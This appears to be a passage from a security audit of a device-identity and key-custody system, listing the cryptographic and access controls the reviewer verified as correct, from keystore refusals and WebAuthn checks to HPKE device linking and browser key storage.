- **The keystore door.** `refuseOnAProductionServer` is called from **both** `load()`
  (`lib/identity/keystore.ts:112`) and `persist()` (`:153`), so `resetKeystore`,
  `restoreFromRecovery` and `installLinkedRoot` cannot write a keystore on a production
  server either. The browser exemption is `typeof window !== "undefined"`, which is the
  device. `probe-no-keystore.mjs`'s "the directory stays empty" is a real property, not an
  artefact of which routes the probe happened to call.
- **The envelope chain and tenant resolution.** `checkEnvelope` (`validator/server.js:419-453`)
  verifies the stored delegation against the stored anchor, the envelope signature against the
  device's own key, and a strictly-increasing per-(device, namespace) counter, then stamps
  `req.layersAnchor` from the device row. A device whose anchor is NULL is refused 409. Joining
  another tenant by forging a delegation requires that tenant's device-auth private key; the
  hijack in finding 2 moves a device *out*, it cannot move one *in*.
- **State scoping under STRICT.** `GET /state`, `GET /state/:ns`, `PUT /state/:ns`,
  `DELETE /state`, `GET /device/list`, `POST /roots` and `POST /events` all refuse unsigned on a
  production validator and scope to `req.layersAnchor` when signed; `anchorOf`'s
  oldest-anchor fallback is unreachable on that shape. The rig's unsigned reads and
  A-CU-RIG-UNSIGNED-READS-ASSUME-ONE-APP are accurately described.
- **The wrap primitive.** `wrapSeed`/`unwrapSeed` (`lib/device/custody/wrap.ts:79-95`): AES-256-GCM
  from the audited platform layer, a fresh 12-byte nonce, the method id as AAD, a hard length
  check on the seed, and a throw on any tag failure. A blob genuinely cannot be replayed under
  another method id. The KEK sources are the right shape; only the fixture's *input* is public
  (finding 1).
- **First-write-wins on an id you hold.** `PUT /custody/method/:id` and `PUT /custody/blob/:id`
  both refuse a different anchor (409/403), and the blob write requires the record to exist and
  be the caller's. A stranger cannot overwrite your blob under your credential id — the gap is
  claiming an id you never wrote (finding 9), not overwriting one you did.
- **WebAuthn assertion verification.** `lib/custody/webauthn.ts` parses no CBOR and no
  attestation; it checks `type === "webauthn.get"`, the challenge under `timingSafeEqual`, the
  origin allow-list, the RP-id hash, the UP flag, and the signature through WebCrypto
  (Ed25519 raw; ES256 after a correct DER→raw conversion — `i = 2 + (der[1] & 0x7f)` for the
  long form is right). The challenge is stateless HMAC with a 120 s TTL, spent once in a map
  that self-prunes. The weaknesses are *which key* and *which rpId* (finding 3), not the
  protocol checks themselves.
- **HPKE device linking.** X25519/HKDF-SHA256/AES-256-GCM from `@hpke/core`; the recipient
  keypair is minted in the new device's memory and never posted; `info` binds the code and the
  device id (`lib/device/linking.ts:22`); the relay row holds only ciphertext, a device key and
  an HPKE public key. `mintCode` is 10 characters from a 32-symbol alphabet with `b % 32` over
  `randomBytes` — exactly uniform, 50 bits, and the alphabet really is 32 long with no
  ambiguous glyphs. Offers are create-once for the sealed write and expire in 10 minutes.
- **The linked mode's refusals.** A linked keystore has no seed: `seedBytes()` throws
  (`keystore.ts:191`), and `linkMaterial`, `createPersona`, `exportPhrase` (via
  `currentSeedHex`) and `signAsDeviceAuth` each refuse with a sentence naming the device that
  can. `linkMaterial` carries the vault key, the zk master and the three per-persona leaves and
  no seed — the payload grep at `accept-cu3.mjs:134-149` is a real assertion (it greps every
  table, not just one).
- **Browser storage.** `crypto.subtle.generateKey({name:"AES-GCM",length:256}, false, …)` —
  `extractable: false`, so "the key cannot be exported by any code, including this code" is
  true; every entry is sealed with the entry's path as AAD; an entry that will not unwrap is
  skipped with a console error rather than guessed at.
- **The dev route.** `app/api/dev/route.ts` refuses the whole route, GET included, on a
  production build without the hooks — closed by closure, not by list, as D-CU-4 claims.
- **The boot contract's two copies** (`lib/platform/env-contract.ts` /
  `validator/env-contract.js`) are byte-equivalent in content and both exit 78 naming names
  and not values. The gap is what the list omits (finding 5), not how it enforces what it has.
- **`sealWhole` on the write side** pads to a KiB multiple and emits one opaque record per
  namespace, and the private-post id is random rather than content-derived (the Gate 1
  iteration-4 fix is in place).
